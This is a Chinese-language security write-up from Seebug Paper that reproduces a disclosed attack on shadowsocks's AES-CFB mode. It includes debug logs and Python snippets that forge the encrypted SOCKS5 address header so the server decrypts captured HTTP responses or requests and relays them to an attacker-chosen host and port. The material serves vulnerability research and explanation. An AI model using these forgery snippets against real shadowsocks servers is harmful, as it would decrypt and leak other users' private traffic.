**作者：LeadroyaL  
原文链接：[https://www.leadroyal.cn/p=1036&from=groupmessage&isappinstalled=0](https://www.leadroyal.cn/p=1036&from=groupmessage&isappinstalled=0)**

2020年2月12日，Zhiniang Peng 在 github 上公开了对于
[shadowsocks](http://https://github.com/edwardz246003/shadowsocks.git
"shadowsocks") 的攻击理论,在阅读完作者的文档后获益匪浅，但 github
中主要是理论，代码和场景写的描述的非常混乱，本文亲自演示一遍整个流程，把整个攻击演示的更清楚。

感谢 chenyuan 的帮助和交流。

本文的全部代码位于：<https://github.com/LeadroyaL/ss-redirect-vuln-exp>

## 一、背景

情景假设：

  1. client 的网络是不安全的，攻击者可以监听 client 所有的流量；

  2. server 的网络是安全的

  3. server 长期存活。

漏洞危害（个人观点）：

  1. 对于加密后的 HTTP Response，攻击者可以解密所有的返回包，严谨一点，是 Response 的绝大部分数据

  2. 对于某个加密后的 HTTP Request，如果攻击者猜中了域名，攻击者就可以解密该 Request，严谨一点，是Request的绝大部分数据

  3. 对于某个加密后的 HTTPS Request，如果攻击者猜中了域名，攻击者就可以确认该 Request 确实属于该域名

本文以 python 版的 ss 和 AES-CFB-256为例，讲述一下上面这三种攻击方式。

## 二、整体逻辑

浏览器使用 socks5代理，将数据发给 sslocal服务，sslocal 将数据加密后传递给 ssserver，ssserver
解密数据，访问指定资源，返回加密的数据，sslocal 再解密返回给浏览器。

整个过程比较容易理解，接下来通过阅读代码的方式讲一下整个流程，着重看数据拼接和加密部分。

### sslocal发包流程：

tcpRelay.py 中，类TCPRelayHandler 构造方法里，主动创建 Encryptor结构体。

Encryptor 结构体初始化时，使用 config 里的“PASS”密钥，作为种子，生成真正的 key，将来长期使用，随机产生
rand_iv，在当前数据包中使用。

使用命令 `curl --socks5 127.0.0.1:1080 http://a.baidu.com`，使用socks5 代理，尝试访问
a.baidu.com。

tcpRelay.py中， `_handle_stage_addr` 收到socks5
的协议头，稍加解析和验证，将该数据使用`AES.update(socks5Header)`

tcpRelay.py 中，`_handle_stage_connecting` 收到 HTTP 请求的数据，并将改数据使用
`AES.update(httpRequest)`

最终组合好的明文数据是：

`data = sock5Header + httpRequest`

最终发给服务器最后的数据是：

`rand_iv + AES-cfb(key, rand_iv, data)`

ssserver收包过程省略、ssserver 发包过程省略

### sslocal收包

tcpRelay.py 中， _on_remote_read 收到了 ssserver 返回的数据，前 16 字节是server 生成的
rand_iv2，后面的数据是密文，解密后就是返回包的内容。

相当于：

`httpResponse = AES-cfb(key, rand_iv2, recv_data)`

攻击者只知道 rand_iv、rand_iv2，不知道key，因此无法直接解密整个request 和 response。

## 三、CFB加密模式：

以 AES-256-CFB 为例，它是一种流式加密而不是分组加密，不会直接将明文进行AES 操作，而是
XOR(明文,AES(密文))来计算，因此可以粗略地理解为一个序列无限长的 xor 操作。

CFB 的特性，长话短说，放三个结论：

  1. CFB 的加密和解密函数是一模一样的，因为最后一步是 xor，也就是说连续加密 2 遍就是本身

  2. 密文的某个 byte 被篡改后，解密出来的该 byte 是错的，第 N+1 个block也是错的，其他数据都是正确的

  3. 在给定的 key 和 iv 下，cfb 的每个 block 退化为普通的 xor，已知某段明文和和对应的密文时，可以算出使用的 xor_key，从而可以对该段明文密文进行伪造。【！！！特别注意这条，之后会用到！！！！】

下面的代码（为了便于观看就是0x00 了）可以说明，加密和解密是一样的，最终结果确实是明文和 AES(IV)的异或。请一定要添加
segment_size=128，因为 pycrypto （pycryptodome）的 CFB 默认是1 字节的

    
    
    In [13]: cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128); print(cipher.encrypt(b'\x00'*5).hex())
    c4ebba6062
    In [14]: cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128); print(cipher.decrypt(b'\x00'*5).hex())
    c4ebba6062
    In [15]: cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128); print(cipher.encrypt(bytes.fromhex('c4ebba6062')).hex())
    0000000000
    In [16]: cipher = AES.new(key, AES.MODE_ECB); print(cipher.encrypt(iv).hex())
    c4ebba606297fc5984dc75e2e5f70430

## 四、攻击案例一：解密 HTTP返回包

还是熟悉的例子， `sslocal-1080` ， `ssserver-1081`， `curl --socks5 127.0.0.1:1080
http://a.baidu.com`添加适当的日志，在 `ss-local` 中有如下的日志，与抓包结果相符。（pcap 可以在 git 仓库里找到）

（嫌麻烦的可以只看标题，跳过这堆数据）

#### 初始化 key 和 iv

2020-02-15 18:20:40 INFO | AES-key =
7a95bf926a0333f57705aeac07a362a2daea958c0a0cf8e1e2843b62b127f809  
---|---  
2020-02-15 18:20:49 INFO | encrypt set_iv = 597623d791c86c0e69da60d78de8c6e8  
2020-02-15 18:20:49 INFO | connecting 123.125.114.38:80 from 127.0.0.1:63126  
  
#### IV 拼接 AES.update(socks5Headers)

在使用 IPV4 的情况下，socks5Headers遵循该协议：[0x01 + IP + port]

例如 `017b7d72260050` 表示 `123.125.114.38:80`

2020-02-15 18:20:49 INFO | encrypt input 017b7d72260050  
---|---  
2020-02-15 18:20:49 INFO | encrypt ret
=597623d791c86c0e69da60d78de8c6e85e0639f44d3611  
  
#### AES.update(httpRequest)

2020-02-15 18:20:49 INFO | encrypt
input474554202f20485454502f312e310d0a486f73743a20612e62616964752e636f6d0d0a557365722d4167656e743a206375726c2f372e36342e310d0a4163636570743a202a2f2a0d0a0d0a  
---|---  
2020-02-15 18:20:49 INFO | encrypt ret
=0692d35fd73dd7a37d3eee8245d8232d2728bd97c45a6638c1fb4230c6b402290c9684a41da8a101b108494d7752aa1636899215d5b081ac7ff2cf3bf113c8005d172b4d9fcb50ab0985e7  
  
#### 发送给 ssserver

2020-02-15 18:20:49 INFO | send to remote  
---|---  
597623d791c86c0e69da60d78de8c6e85e0639f44d36110692d35fd73dd7a37d3eee8245d8232d2728bd97c45a6638c1fb4230c6b402290c9684a41da8a101b108494d7752aa1636899215d5b081ac7ff2cf3bf113c8005d172b4d9fcb50ab0985e7
|  
  
#### 收到来自 ssserver

2020-02-15 18:20:49 INFO | recv from remote  
---|---  
83fd8540bb239f54661c57193a9557a538d494faef23a83936fbe00cb700d79c9e9fd2b19dafc46d3a7784f6b4800c8fcb060e2c0b0d9f54848b549739f6b77ea5f76882879b8b929f45aebb2020dafc65809efab745c6ca2ee4ee4be19f8aa9b860b3045b566bb78d2fbe34ea64c49d6eed64055a2fe8354b659138597900ee0c0614af13439ccb3e309845b60e190784c3519abcc4ddb87040c43a0331a9b1e51bf271c292621a5685e0f06bd398670eb77927e2cd90dcb2cc167724c944e4ceaddd28718b80e72555431dbd18b4cb0fb5237d7d3a57d03872e10dc694081f0437b3014178e367baac9c0cb746799d8bd7be5a17
|  
  
#### 前16 byte的数据是iv，后面是余下的数据

2020-02-15 18:20:49 INFO | decrypt set_iv = 83fd8540bb239f54661c57193a9557a5  
---|---  
2020-02-15 18:20:49 INFO | decrypt input =
38d494faef23a83936fbe00cb700d79c9e9fd2b19dafc46d3a7784f6b4800c8fcb060e2c0b0d9f54848b549739f6b77ea5f76882879b8b929f45aebb2020dafc65809efab745c6ca2ee4ee4be19f8aa9b860b3045b566bb78d2fbe34ea64c49d6eed64055a2fe8354b659138597900ee0c0614af13439ccb3e309845b60e190784c3519abcc4ddb87040c43a0331a9b1e51bf271c292621a5685e0f06bd398670eb77927e2cd90dcb2cc167724c944e4ceaddd28718b80e72555431dbd18b4cb0fb5237d7d3a57d03872e10dc694081f0437b3014178e367baac9c0cb746799d8bd7be5a17  
  
#### 解密结果是真正的 httpResponse

2020-02-15 18:20:49 INFO | decrypt ret =  
---|---  
485454502f312e3120323030204f4b0d0a446174653a205361742c2031352046656220323032302031303a32303a343920474d540d0a5365727665723a2045434f4d2041706163686520312e302e31332e300d0a4c6173742d4d6f6469666965643a205468752c203232204f637420323031352030373a30383a303020474d540d0a455461673a2022356639343665612d332d3536323838623530220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20330d0a436f6e74656e742d547970653a20746578742f68746d6c0d0a0d0a4f4b0a
|  
  
#### 正片开始

我们关注一下这个返回包:

因为去掉头部的16字节iv，第一个 block 的密文数据是： `38d494faef23a83936fbe00cb700d79c` ；

而第一个 block 的明文数据可以被猜到，是8 字节的 `HTTP/1.1` ；

因此第一个 block 的 xor_key[:8]是 bytes.fromhex(’38d494faef23a83936fbe00cb700d79c’) ^
b”HTTP/1.1″，结果是 `7080c0aac0128608` 验算一下：AES(iv) =
`7080c0aac012860816c9d03c974f9c91` ，完全一致。

注意上面的【结论3】，此时我们拥有能力伪造密文的前 8byte，从而让服务器解密出我们想要的前 8 byte。

在我们的案例中，ssserver 收到 sslocal的包时，前 7 byte 是[0x01 + IP + port]，表示需要被访问的地址。

因此我们有能力控制这7个 byte，ssserver 将解密后的数据，发给我们指定的IPport 。

思路有了，具体操作如下：取返回包，切掉前 16byte，将前7byte 改写为 xor(xor_key,[0x01 + IP +
port])，后面的内容不变。

服务器解密时，可以正确拿到
IP、port，并且正确解密[7:16]的其他数据，错误解密[16:32]，正确解密[32:]的数据，并且将[7:]解密后发送给我们指定的IP:
port,直接监听即可完成攻击。

代码如下：

    
    
     predict_data=b"HTTP/1.1"
     predict_xor_key=bytes([(predict_data[i]^recv_data[i])foriinrange(len(predict_data))])
    
    target_ip="127.0.0.1"
    target_port=1083
    fake_header=b'\x01'+socket.inet_pton(socket.AF_INET,target_ip)+bytes(struct.pack('>H',target_port))
    fake_header=bytes([(fake_header[i]^predict_xor_key[i])foriinrange(len(fake_header))])
    fake_data=recv_iv+fake_header+recv_data[len(fake_header):]print(fake_data.hex())

效果图如下：

![](https://images.seebug.org/content/images/2020/02/80790e4c-06aa-4f2e-8d3e-ec2aa2914cde.png-w331s)

## 五、攻击案例二：解密指定 domain 的 httpRequest包

request 与 response 有很大的不同，response 中最前面的字节肯定是 HTTP，而 request 最前面的字节是sock5 协议。

在IP 表示的情况下，是[0x01 + IP + port]，理论上，攻击者有1/int32 的概率猜对 IP，之后模仿之前的方式，将 IP 改为指定的
IP，但这样代价非常高，每个包都要猜一次 int32，是不可行的。

在domain 表示的情况下，最前面是[0x03 + domain_len + domain + port]，而猜 domain 的难度可能比猜
IP要低，例如我只想知道这个包是不是发给 a.baidu.com 的。就假设发包的明文是 a.baidu.com，如果猜中了，就可以将它篡改为
a.baidu.abc。

这里演示一下对给定的 httpRequest 包，假设 domain 是 a.baidu.com 的攻击方式。

curl 默认是本地 DNS 解析，所以会出现0x1+IP+port
的现象，大多数情况下，浏览器会直接把域名发给sslocal，是0x03+domain+port
的方式。因此需要用浏览器触发一下，然后打日志抓包，这里就不赘述了。

发包的明文是： `03 + 0B + "a.baidu.com" + port(80)`

发包的密文是： `67c9c0858b1beecc3c0b07cb310849b0`

发包的 xor_key 是： `64c2a1abe97a87a8492564a45c0819`

因此可以构造： `03 + 0B + "a.baidu.abc" + port(1083)`

ssserver 收到后就会把后面的数据发给 a.baidu.abc:1083，为了方便，我把 a.baidu.abc
指向127.0.0.1了，发现确实可以收到数据。

代码如下

    
    
    predict_data = b"\x03\x0ba.baidu.com\x00\x50" # a.baidu.com:80
    predict_xor_key = bytes([(predict_data[i] ^ send_data[i]) for i in range(len(predict_data))])
    
    target_domain = b"a.baidu.abc"
    target_port = 1083target_domain = b"\x03\x0b" + target_domain + bytes(struct.pack('>H', target_port))
    fake_header = bytes([(target_domain[i] ^ predict_xor_key[i]) for i in range(len(target_domain))])
    fake_data = send_iv + fake_header + send_data[len(fake_header):]
    print(fake_data.hex()) |

效果图如下：

![](https://images.seebug.org/content/images/2020/02/d8a001ca-5e1b-4eac-a5c7-e47398eb3759.png-w331s)

## 六、攻击案例三：确认 https 流量是否属于某个域名

例如访问的数据包，明文是：

![](https://images.seebug.org/content/images/2020/02/5d97ab16-e5e5-465e-a95c-c67dcea5a590.jpg-w331s)

显然明文开头的那部分是可以猜的，猜中后同样可以使用案例二的方式，把流量打给指定的服务器。但缺点是没有具体内容，只知道是个的包。（对于某些情景下来说已经够了，你懂得）

看吧，虽然是 https，但也不是非常的安全。。。

## 七、要点总结

  1. ssserver 可以理解为黑盒解密机器，解密后的前几个 byte 决定发往的地址，后几个 byte 就是明文数据。

  2. 因 CFB 的特性，在第一个 block 退化为了普通的 xor，已知明文的情况下，导致密文可以被伪造。

  3. 攻击方式的局限性：server 一定要在线，因为只有 server 才能解密数据，存在被发现的可能。

本文的全部代码位于：<https://github.com/LeadroyaL/ss-redirect-vuln-exp>，欢迎交流。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1122/>

